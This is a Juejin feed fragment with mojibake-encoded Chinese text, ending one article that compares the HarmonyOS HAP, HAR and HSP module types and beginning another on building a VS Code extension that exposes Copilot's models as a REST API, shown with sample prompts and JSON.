<li>ä½ æœ‰ä¸€å¥— UI ç»„ä»¶åº“ï¼ˆæ¯”å¦‚ Design Systemï¼‰è¦ç»™å¤šä¸ªé¡¹ç›®ç”¨ï¼›</li>
<li>å°è£…äº†ç½‘ç»œè¯·æ±‚ã€æ—¥å¿—ã€åŠ å¯†ç­‰é€šç”¨é€»è¾‘ï¼›</li>
<li>å›¢é˜Ÿåä½œï¼Œéœ€è¦æ¨¡å—è§£è€¦ã€‚</li>
</ul>
<h3 data-id="heading-8">ğŸ“ åˆ›å»ºæ–¹å¼ï¼ˆDevEco Studioï¼‰ï¼š</h3>
<p>æ–°å»ºæ¨¡å— â†’ é€‰æ‹© <strong>â€œShared Libraryâ€</strong> â†’ ç”Ÿæˆçš„å°±æ˜¯ HARã€‚</p>
<h3 data-id="heading-9">âš ï¸ æ³¨æ„é™åˆ¶ï¼š</h3>
<ul>
<li>HAR <strong>ä¸èƒ½åŒ…å« Abilityï¼ˆé¡µé¢/æœåŠ¡ï¼‰</strong> â€”â€” å®ƒåªæ˜¯â€œå·¥å…·ç®±â€ï¼Œä¸æ˜¯â€œåº”ç”¨â€ã€‚</li>
<li>èµ„æº ID åœ¨ä¸åŒ HAR é—´å¯èƒ½å†²çªï¼ˆå»ºè®®åŠ å‰ç¼€ï¼‰ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-10">ğŸ”’ 3. HSPï¼šHarmonyOS Static Packageï¼ˆé™æ€åŒ…ï¼‰</h2>
<h3 data-id="heading-11">âœ… å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p>HSP æ˜¯ <strong>ä»…é™å½“å‰ App å†…éƒ¨ä½¿ç”¨çš„é™æ€åº“</strong>ï¼Œç¼–è¯‘æ—¶ä¼šç›´æ¥â€œåˆå¹¶â€è¿›ä¸» HAPã€‚</p>
<ul>
<li>ä¸ä¼šè¢«å…¶ä»– App å¼•ç”¨ï¼›</li>
<li>æœ€ç»ˆä¸ä¼šç”Ÿæˆç‹¬ç«‹æ–‡ä»¶ï¼Œè€Œæ˜¯â€œå†…è”â€åˆ° HAP ä¸­ï¼›</li>
<li>æ›´å®‰å…¨ï¼ˆä»£ç ä¸æš´éœ²ï¼‰ã€æ›´è½»é‡ï¼ˆæ— è¿è¡Œæ—¶å¼€é”€ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-12">ğŸ› ï¸ ä»€ä¹ˆæ—¶å€™ç”¨ HSPï¼Ÿ</h3>
<ul>
<li>å·¥å…·å‡½æ•°ã€å¸¸é‡ã€ç§æœ‰ä¸šåŠ¡é€»è¾‘ï¼Œä¸æƒ³å¯¹å¤–æš´éœ²ï¼›</li>
<li>è¿½æ±‚æè‡´æ€§èƒ½ï¼Œé¿å… HAR çš„åŠ¨æ€åŠ è½½å¼€é”€ï¼›</li>
<li>æ¨¡å—åªåœ¨æœ¬ App å†…ä½¿ç”¨ï¼Œæ— éœ€å…±äº«ã€‚</li>
</ul>
<h3 data-id="heading-13">ğŸ“ åˆ›å»ºæ–¹å¼ï¼š</h3>
<p>æ–°å»ºæ¨¡å— â†’ é€‰æ‹© <strong>â€œStatic Libraryâ€</strong> â†’ ç”Ÿæˆ HSPã€‚</p>
<hr/>
<h2 data-id="heading-14">ğŸ” å¯¹æ¯”æ€»ç»“è¡¨</h2>















































<table><thead><tr><th>ç‰¹æ€§</th><th>HAP</th><th>HAR</th><th>HSP</th></tr></thead><tbody><tr><td><strong>ç”¨é€”</strong></td><td>åº”ç”¨å®‰è£…åŒ…</td><td>å…±äº«åº“</td><td>é™æ€ç§æœ‰åº“</td></tr><tr><td><strong>èƒ½å¦è¢«å®‰è£…</strong></td><td>âœ… æ˜¯</td><td>âŒ å¦</td><td>âŒ å¦</td></tr><tr><td><strong>èƒ½å¦åŒ…å«é¡µé¢ï¼ˆAbilityï¼‰</strong></td><td>âœ… æ˜¯</td><td>âŒ å¦</td><td>âŒ å¦</td></tr><tr><td><strong>èƒ½å¦è¢«å¤šä¸ª App å…±ç”¨</strong></td><td>âŒ å¦</td><td>âœ… æ˜¯</td><td>âŒ å¦</td></tr><tr><td><strong>ç¼–è¯‘äº§ç‰©</strong></td><td><code>.hap</code></td><td><code>.har</code></td><td>æ— ç‹¬ç«‹æ–‡ä»¶ï¼ˆå†…è”ï¼‰</td></tr><tr><td><strong>åˆ›å»ºæ¨¡æ¿</strong></td><td>Empty Ability</td><td>Shared Library</td><td>Static Library</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-15">ğŸ¯ å®é™…å¼€å‘å»ºè®®</h2>
<ol>
<li><strong>ä¸» App åŠŸèƒ½ â†’ ç”¨ HAP</strong>ï¼ˆEntry + Featureï¼‰ï¼›</li>
<li><strong>è·¨é¡¹ç›®å¤ç”¨ç»„ä»¶/é€»è¾‘ â†’ ç”¨ HAR</strong>ï¼›</li>
<li><strong>ä»…æœ¬é¡¹ç›®å†…éƒ¨å·¥å…· â†’ ç”¨ HSP</strong>ï¼ˆæ›´å®‰å…¨é«˜æ•ˆï¼‰ï¼›</li>
<li><strong>ä¸è¦æŠŠä¸šåŠ¡é¡µé¢æ”¾è¿› HAR/HSP</strong> â€”â€” å®ƒä»¬åªèƒ½æ”¾â€œè¾…åŠ©ä»£ç â€ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-16">ğŸ§ª ä¸¾ä¸ªä¾‹å­</h2>
<p>å‡è®¾ä½ åœ¨å¼€å‘ä¸€ä¸ªç”µå•† Appï¼š</p>
<ul>
<li><code>entry</code> â†’ ä¸» HAPï¼ˆé¦–é¡µã€å•†å“åˆ—è¡¨ï¼‰</li>
<li><code>feature_cart</code> â†’ è´­ç‰©è½¦ HAPï¼ˆæŒ‰éœ€åŠ è½½ï¼‰</li>
<li><code>common_ui.har</code> â†’ é€šç”¨æŒ‰é’®ã€å¼¹çª—ç»„ä»¶ï¼ˆå¤šä¸ª App å…±ç”¨ï¼‰</li>
<li><code>utils.hsp</code> â†’ æœ¬åœ°åŠ å¯†ã€æ—¶é—´æ ¼å¼åŒ–ï¼ˆä»…æœ¬ App ç”¨ï¼‰</li>
</ul>
<p>è¿™æ ·ç»“æ„æ¸…æ™°ï¼Œå¤ç”¨æ€§å¼ºï¼Œä¹Ÿä¾¿äºå›¢é˜Ÿåˆ†å·¥ï¼</p>
<hr/>
<h2 data-id="heading-17">âœ… ç»“è¯­</h2>
<p>HAPã€HARã€HSP æ˜¯é¸¿è’™æ¨¡å—åŒ–å¼€å‘çš„ä¸‰å¤§åŸºçŸ³ã€‚<br/>
ç†è§£å®ƒä»¬çš„åŒºåˆ«ï¼Œèƒ½å¸®ä½ å†™å‡ºæ›´è§„èŒƒã€å¯ç»´æŠ¤ã€é«˜æ€§èƒ½çš„ HarmonyOS åº”ç”¨ã€‚</p>
<blockquote>
<p>ğŸ“Œ è®°ä½å£è¯€ï¼š<br/>
<strong>HAP è£…å¾—ä¸‹ï¼ŒHAR åˆ†äº«å®ƒï¼ŒHSP ç§è—å§ï¼</strong></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¼–å†™ä¸€ä¸ª VS Code æ‰©å±•ï¼šå°† Copilot æ”¯æŒçš„å¤§æ¨¡å‹é€šè¿‡ REST API æ–¹å¼æš´éœ²å‡ºæ¥]]></title>    <link>https://juejin.cn/post/7582413770091937830</link>    <guid>https://juejin.cn/post/7582413770091937830</guid>    <pubDate>2025-12-11T22:49:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582413770091937830" data-draft-id="7582425536464109594" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¼–å†™ä¸€ä¸ª VS Code æ‰©å±•ï¼šå°† Copilot æ”¯æŒçš„å¤§æ¨¡å‹é€šè¿‡ REST API æ–¹å¼æš´éœ²å‡ºæ¥"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-11T22:49:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç£Šç£Šè½è½"/> <meta itemprop="url" content="https://juejin.cn/user/3054882885469577"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¼–å†™ä¸€ä¸ª VS Code æ‰©å±•ï¼šå°† Copilot æ”¯æŒçš„å¤§æ¨¡å‹é€šè¿‡ REST API æ–¹å¼æš´éœ²å‡ºæ¥
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3054882885469577/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç£Šç£Šè½è½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T22:49:47.000Z" title="Thu Dec 11 2025 22:49:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯ç£Šç£Šè½è½ï¼Œç›®å‰æˆ‘åœ¨æŠ€æœ¯ä¸Šä¸»è¦å…³æ³¨ï¼šJavaã€Golangã€AIã€æ¶æ„è®¾è®¡ã€äº‘åŸç”Ÿå’Œè‡ªåŠ¨åŒ–æµ‹è¯•ã€‚æ¬¢è¿æ¥æˆ‘çš„åšå®¢ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fleileiluoluo.com%2Fposts%2Fcopilot-rest-api-extension.html" target="_blank" title="https://leileiluoluo.com/posts/copilot-rest-api-extension.html" ref="nofollow noopener noreferrer">leileiluoluo.com</a>ï¼‰è·å–æˆ‘çš„æœ€è¿‘æ›´æ–°ï¼</p>
</blockquote>
<p>åœ¨ AI è¾…åŠ©ç¼–ç¨‹çš„æ—¶ä»£ï¼ŒCopilot å·²ç»æˆä¸ºä¼—å¤šå¼€å‘è€…çš„å¾—åŠ›åŠ©æ‰‹ã€‚æˆ‘ä»¬åªè¦æ‹¥æœ‰ä¸€ä¸ª GitHub è´¦å·ï¼Œåªè¦å¼€é€šäº† Copilotï¼Œå³å¯åœ¨ VS Code ç­‰ç¼–è¾‘å™¨ä¸­ä½¿ç”¨å®ƒã€‚è€Œä¸” Copilot å¯é€‰çš„å¤§æ¨¡å‹æ—¥ç›Šå¢å¤šï¼Œä»æœ€åˆçš„ Codex æ¨¡å‹åˆ°å¦‚ä»Šæ”¯æŒæ›´å¼ºå¤§çš„ GPT-5 ç³»åˆ—ï¼Œæ¨¡å‹èƒ½åŠ›ä¸æ–­å¢å¼ºã€‚</p>
<p>ç„¶è€Œï¼ŒCopilot çš„èƒ½åŠ›è¢«å®Œå…¨é‡Šæ”¾äº†å—ï¼Ÿç­”æ¡ˆæ˜¯å¦å®šçš„ã€‚å®ƒä¾ç„¶è¢«é™åˆ¶åœ¨ IDE æ’ä»¶ã€ç‰¹å®šå·¥ä½œæµçš„æ¡†æ¶å†…ã€‚å¦‚æœæˆ‘ä»¬å¯ä»¥å°† Copilot èƒŒåçš„å¤§æ¨¡å‹èƒ½åŠ›ã€Œè§£æ”¾ã€å‡ºæ¥ï¼Œé€šè¿‡ç®€å•ã€é€šç”¨çš„ REST API æä¾›ç»™æ›´å¤šå¼€å‘è€…ã€å·¥å…·å’Œåº”ç”¨è°ƒç”¨ï¼Œå°†ä¼šå¸¦æ¥å“ªäº›å¯èƒ½æ€§ï¼Ÿ</p>
<p>ä»Šå¤©ï¼Œæˆ‘ä»¬å°±å°†å…±åŒæ¢ç´¢è¿™ä¸ªå®è·µï¼šå¦‚ä½•é€šè¿‡ç¼–å†™ä¸€ä¸ª VS Code æ‰©å±•ï¼Œå°† Copilot æ”¯æŒçš„å¤§æ¨¡å‹è½¬åŒ–ä¸ºå¯çµæ´»è°ƒç”¨çš„ API æœåŠ¡ã€‚</p>
<h2 data-id="heading-0">1 ä¸ºä»€ä¹ˆéœ€è¦ä¸€ä¸ª VS Code æ‰©å±•</h2>
<p>ä¸‹é¢ä»¥åœ¨ VS Code ä¸­å€ŸåŠ© Copilot æ‰¹é‡ç”ŸæˆæŠ¥å‘Šä¸ºä¾‹æ¥è¯´æ˜ä¸ºä»€ä¹ˆéœ€è¦ç¼–å†™ä¸€ä¸ª VS Code æ‰©å±•ã€‚</p>
<p>å‡è®¾ï¼Œæˆ‘æ­£åœ¨ä¸ºä¸€ä¸ªåšå®¢èšåˆç½‘ç«™åšå¹´åº¦æŠ¥å‘Šã€‚æ‹¥æœ‰çš„åˆå§‹æ•°æ®æ˜¯ä¸€ä¸ª JSON æ•°ç»„ <code>blog-posts.json</code>ï¼Œè¯¥æ•°ç»„è®°å½•äº†èšåˆç½‘ç«™ä¸­æ‰€æœ‰åšå®¢åœ¨ 2025 å…¨å¹´å‘å¸ƒçš„æ–‡ç« ã€‚</p>
<p>æ ¼å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">[</span>
  <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"blog"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"leileiluoluo.com"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"articles"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"æç¤ºå·¥ç¨‹éœ€è¦éµå¾ªçš„äº”ä¸ªåŸåˆ™ï¼ˆé™„å®è·µæ¡ˆä¾‹ï¼‰"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"é—œæ–¼ 2026 å¹´å³å°‡ç”Ÿæ•ˆçš„ã€Œå¸æ¯’è¨˜éŒ„å¯å°å­˜ã€æ³•æ¡ˆ"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"å¦‚ä½•ä½¿ç”¨ Spec Kit å·¥å…·è¿›è¡Œè§„èŒƒé©±åŠ¨å¼€å‘ï¼Ÿ"</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
  <span class="hljs-comment">// ...</span>
<span class="hljs-punctuation">]</span>
</code></pre>
<p>å¦‚æœæˆ‘æƒ³å€ŸåŠ© Copilotï¼Œè®©å…¶åŸºäºä¸Šè¿°æ•°æ®æ‰¹é‡ç”Ÿæˆæ‰€æœ‰åšå®¢çš„å¹´åº¦æŠ¥å‘Š <code>blog-summary.json</code>ï¼ˆæ ¼å¼å¦‚ä¸‹ï¼‰ï¼Œè¯¥å¦‚ä½•åšå‘¢ï¼Ÿ</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">[</span>
  <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"blog"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"leileiluoluo.com"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"summary"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"æ‚¨çš„åšå®¢æ–‡ç« æ¶µç›–äº†æŠ€æœ¯å¼€å‘ã€ç¤¾ä¼šçƒ­ç‚¹å’Œä¸ªäººç”Ÿæ´»ç­‰å¤šä¸ªé¢†åŸŸã€‚åœ¨æŠ€æœ¯æ–¹é¢ï¼Œæ‚¨æ·±å…¥æ¢è®¨äº†æç¤ºå·¥ç¨‹ã€è§„èŒƒé©±åŠ¨å¼€å‘ã€Spring Boot æ¡†æ¶çš„åº”ç”¨ã€æ•°æ®åº“è¿ç§»ä¸ä¼˜åŒ–ç­‰ä¸»é¢˜ï¼Œå±•ç¤ºäº†å¯¹å‰æ²¿æŠ€æœ¯çš„å…³æ³¨ä¸å®è·µç»éªŒçš„åˆ†äº«ï¼›åŒæ—¶ï¼Œæ‚¨è¿˜ä»‹ç»äº† Markdown ç¼–ç¨‹è¯­è¨€çš„æ½œåŠ›ã€MapStruct å¯¹è±¡æ˜ å°„å·¥å…·çš„ä¼˜åŠ¿ï¼Œä»¥åŠ MCP åœ¨æµè§ˆå™¨è‡ªåŠ¨åŒ–ä¸­çš„åº”ç”¨ç­‰å†…å®¹ï¼Œä½“ç°äº†å¯¹æŠ€æœ¯è¶‹åŠ¿çš„æ•é”æ´å¯Ÿã€‚åœ¨ç¤¾ä¼šçƒ­ç‚¹æ–¹é¢ï¼Œæ‚¨å…³æ³¨äº†å¸æ¯’è®°å½•å°å­˜æ³•æ¡ˆã€å†å²äº‹ä»¶ä»¥åŠç¤¾ä¼šæ¡ˆä»¶ï¼Œè¡¨è¾¾äº†ç‹¬åˆ°çš„è§è§£ã€‚åœ¨ä¸ªäººç”Ÿæ´»æ–¹é¢ï¼Œæ‚¨è®°å½•äº†å¤šæ¬¡æ—…è¡Œä¸å®¶åº­æ´»åŠ¨ï¼Œå±•ç°äº†å¯¹è‡ªç„¶é£å…‰çš„çƒ­çˆ±ä¸å®¶åº­ç”Ÿæ´»çš„æ¸©é¦¨ã€‚è¿™äº›æ–‡ç« å†…å®¹ä¸°å¯Œï¼Œå…¼å…·ä¸“ä¸šæ€§ä¸ç”Ÿæ´»åŒ–ï¼Œä½“ç°äº†å¹¿æ³›çš„å…´è¶£ä¸æ·±åˆ»çš„æ€è€ƒã€‚"</span>
  <span class="hljs-punctuation">}</span>
  <span class="hljs-comment">// ...</span>
<span class="hljs-punctuation">]</span>
</code></pre>
<p>è¦å®ç°è¿™ä¸ªä»»åŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆä»ä¸€ä¸ªåšå®¢å¼€å§‹ï¼Œç¼–å†™æç¤ºè¯çœ‹çœ‹æ•ˆæœï¼Œæ²¡é—®é¢˜å†è®© Copilot è¿ç”¨åˆ°æ‰€æœ‰åšå®¢ã€‚</p>
<p>é’ˆå¯¹å•ä¸ªåšå®¢ç”Ÿæˆå¹´åº¦æ€»ç»“çš„æç¤ºè¯å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-text" lang="text">ä¸‹é¢æ˜¯ä¸€ä¸ªåšå®¢åœ¨ 2025 å¹´å‘å¸ƒçš„æ‰€æœ‰æ–‡ç« ï¼Œè¯·ä»¥ã€Œæ‚¨çš„åšå®¢æ–‡ç« æ¶µç›–äº†...ã€å¼€å§‹å†™ä¸€æ®µ 200 å­—ä»¥å†…çš„æ€»ç»“ï¼š

{
  "blog": "leileiluoluo.com",
  "articles": [
    "æç¤ºå·¥ç¨‹éœ€è¦éµå¾ªçš„äº”ä¸ªåŸåˆ™ï¼ˆé™„å®è·µæ¡ˆä¾‹ï¼‰",
    "é—œæ–¼ 2026 å¹´å³å°‡ç”Ÿæ•ˆçš„ã€Œå¸æ¯’è¨˜éŒ„å¯å°å­˜ã€æ³•æ¡ˆ",
    "å¦‚ä½•ä½¿ç”¨ Spec Kit å·¥å…·è¿›è¡Œè§„èŒƒé©±åŠ¨å¼€å‘ï¼Ÿ",
    ...
  ]
}
</code></pre>
<p>å¯ä»¥çœ‹åˆ° Copilot å®Œç¾çš„å®Œæˆäº†ä»»åŠ¡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7c8153ec85c466f9cdb82701e3ad843~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56OK56OK6JC96JC9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766098188&amp;x-signature=otr5lTGjd381RglJobdoCpqvt0k%3D" alt="ä½¿ç”¨ Copilot ç”Ÿæˆå•ä¸ªåšå®¢çš„å¹´åº¦æ€»ç»“" loading="lazy"/></p>
<p>æ¥ä¸‹æ¥å°è¯•ç¼–å†™æç¤ºè¯ï¼Œè®© Copilot è¿ç”¨åˆ°æ‰€æœ‰åšå®¢ã€‚</p>
<pre><code class="hljs language-text" lang="text">annual-report æ–‡ä»¶å¤¹ä¸‹çš„ blog-posts.json æ–‡ä»¶åŒ…å«äº†å¤šä¸ªåšå®¢åœ¨ 2025 å¹´çš„æ‰€æœ‰æ–‡ç« æ ‡é¢˜ã€‚

æ‚¨éœ€è¦é’ˆå¯¹æ¯ä¸ªåšå®¢åœ¨è¿™ä¸€å¹´å‘å¸ƒçš„æ‰€æœ‰æ–‡ç« æ ‡é¢˜ï¼Œä»¥ã€Œæ‚¨çš„åšå®¢æ–‡ç« æ¶µç›–äº†...ã€å¼€å§‹å†™ä¸€æ®µ 200 å­—ä»¥å†…çš„æ€»ç»“ã€‚

æœ€åä»¥ `blog-summary.json` ä¸ºæ–‡ä»¶åï¼Œè¾“å‡ºä¸€ä¸ªåŒ…å«æ‰€æœ‰åšå®¢æ€»ç»“çš„ JSON æ•°ç»„ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š

[
  {
    "blog": "leileiluoluo.com",
    "summary": "æ‚¨çš„åšå®¢æ–‡ç« æ¶µç›–äº†æŠ€æœ¯å¼€å‘ã€ç¤¾ä¼šçƒ­ç‚¹å’Œä¸ªäººç”Ÿæ´»ç­‰å¤šä¸ªé¢†åŸŸã€‚åœ¨æŠ€æœ¯æ–¹é¢ï¼Œæ‚¨æ·±å…¥æ¢è®¨äº†æç¤ºå·¥ç¨‹ã€è§„èŒƒé©±åŠ¨å¼€å‘ã€Spring Boot æ¡†æ¶çš„åº”ç”¨ã€æ•°æ®åº“è¿ç§»ä¸ä¼˜åŒ–ç­‰ä¸»é¢˜ï¼Œå±•ç¤ºäº†å¯¹å‰æ²¿æŠ€æœ¯çš„å…³æ³¨ä¸å®è·µç»éªŒçš„åˆ†äº«ï¼›åŒæ—¶ï¼Œæ‚¨è¿˜ä»‹ç»äº† Markdown ç¼–ç¨‹è¯­è¨€çš„æ½œåŠ›ã€MapStruct å¯¹è±¡æ˜ å°„å·¥å…·çš„ä¼˜åŠ¿ï¼Œä»¥åŠ MCP åœ¨æµè§ˆå™¨è‡ªåŠ¨åŒ–ä¸­çš„åº”ç”¨ç­‰å†…å®¹ï¼Œä½“ç°äº†å¯¹æŠ€æœ¯è¶‹åŠ¿çš„æ•é”æ´å¯Ÿã€‚åœ¨ç¤¾ä¼šçƒ­ç‚¹æ–¹é¢ï¼Œæ‚¨å…³æ³¨äº†å¸æ¯’è®°å½•å°å­˜æ³•æ¡ˆã€å†å²äº‹ä»¶ä»¥åŠç¤¾ä¼šæ¡ˆä»¶ï¼Œè¡¨è¾¾äº†ç‹¬åˆ°çš„è§è§£ã€‚åœ¨ä¸ªäººç”Ÿæ´»æ–¹é¢ï¼Œæ‚¨è®°å½•äº†å¤šæ¬¡æ—…è¡Œä¸å®¶åº­æ´»åŠ¨ï¼Œå±•ç°äº†å¯¹è‡ªç„¶é£å…‰çš„çƒ­çˆ±ä¸å®¶åº­ç”Ÿæ´»çš„æ¸©é¦¨ã€‚è¿™äº›æ–‡ç« å†…å®¹ä¸°å¯Œï¼Œå…¼å…·ä¸“ä¸šæ€§ä¸ç”Ÿæ´»åŒ–ï¼Œä½“ç°äº†å¹¿æ³›çš„å…´è¶£ä¸æ·±åˆ»çš„æ€è€ƒã€‚"
  }
  // ...
]
</code></pre>
<p>ä¸Šè¿°æç¤ºè¯å‘å‡ºåï¼ŒCopilot å¼€å§‹ç¼–å†™ Python è„šæœ¬ï¼Œè¯•å›¾ç”¨ç¨‹åºçš„æ–¹å¼å»å®ç°è¿™ä¸ªæ‰¹é‡ä»»åŠ¡ã€‚</p>
<p>ä½†æ˜¯ç»“æœå¾ˆä¸ç†æƒ³ï¼Œå…¶ç”Ÿæˆçš„æ€»ç»“éå¸¸çš„å•è–„ã€‚</p>
